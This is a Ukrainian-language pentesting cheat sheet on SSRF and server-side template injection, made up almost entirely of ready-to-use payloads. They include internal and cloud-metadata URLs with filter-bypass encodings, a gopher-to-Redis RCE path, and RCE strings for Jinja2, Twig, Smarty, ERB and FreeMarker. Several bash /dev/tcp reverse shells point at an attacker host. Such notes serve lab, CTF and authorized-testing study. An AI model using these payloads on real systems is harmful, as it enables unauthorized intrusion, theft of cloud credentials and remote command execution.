# SSRF + SSTI

---

## SSRF (Server-Side Request Forgery)

### Де шукати
Параметри з URL або IP: `url=`, `src=`, `path=`, `redirect=`, `host=`, `img=`, `page=`, `uri=`  
Webhook-поля, import-by-URL, XML-парсери, PDF-генератори.

### Базові перевірки
```
# Внутрішня мережа:
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/          # AWS IMDSv1
http://metadata.google.internal/computeMetadata/v1/  # GCP (додай: Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance           # Azure

# Внутрішні порти / сервіси:
http://127.0.0.1:8080/
http://127.0.0.1:22/
http://192.168.1.1/

# Обхід фільтрів:
http://0177.0.0.1/          # octal
http://0x7f000001/          # hex
http://127.1/               # short form
http://[::1]/               # IPv6 loopback
http://localtest.me/        # DNS -> 127.0.0.1
```

### Корисні протоколи (якщо сервер підтримує)
```
file:///etc/passwd
dict://127.0.0.1:6379/INFO          # Redis
gopher://127.0.0.1:25/_HELO         # SMTP
```

### SSRF → RCE через Redis
```
# якщо Redis без auth і SSRF через gopher:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
# використовуй Gopherus для генерації payload:
python3 gopherus.py --exploit redis
```

### Burp Collaborator / webhook.site
Поставити зовнішній URL щоб підтвердити out-of-band SSRF до подальшого піднесення.

---

## SSTI (Server-Side Template Injection)

### Визначення рушія (detection tree)
```
Payload → Результат → Рушій
{{7*7}}  → 49        → Jinja2 / Twig (потребує уточнення)
${7*7}   → 49        → FreeMarker / Velocity / Smarty
<%= 7*7 %> → 49     → ERB (Ruby)
{{7*'7'}} → 49 (int) → Jinja2
{{7*'7'}} → 7777777  → Twig
#{7*7}   → 49        → Pebble / Thymeleaf
```

### Jinja2 (Python / Flask) → RCE
```python
# підтвердження:
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# обхід фільтрів (якщо крапки заблоковано):
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# reverse shell:
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"').read()}}
```

### Twig (PHP) → RCE
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
# або:
{{['id']|filter('system')}}
{{['bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"']|filter('passthru')}}
```

### Smarty (PHP) → RCE
```
{php}echo `id`;{/php}
{system('id')}
```

### ERB (Ruby / Rails) → RCE
```ruby
<%= `id` %>
<%= system("bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'") %>
```

### FreeMarker (Java) → RCE
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Інструмент: tplmap
```bash
python3 tplmap.py -u 'http://<IP>/page?name=*' --os-shell
```

**Підводні камені:**
- Jinja2: `{{` і `}}` можуть бути відфільтровані — пробуй `{%` або `{#`
- Перевіряй payload у preview/error-повідомленнях, email-шаблонах, PDF-генераторах
- SSRF через SSTI: Jinja2 може робити HTTP-запити зсередини сервера

**Зв'язки:** [[Web-Recon]] · [[Ffuf-Fuzzing]] · [[File-Inclusion-LFI-RFI]] · [[Shells-Payloads]]
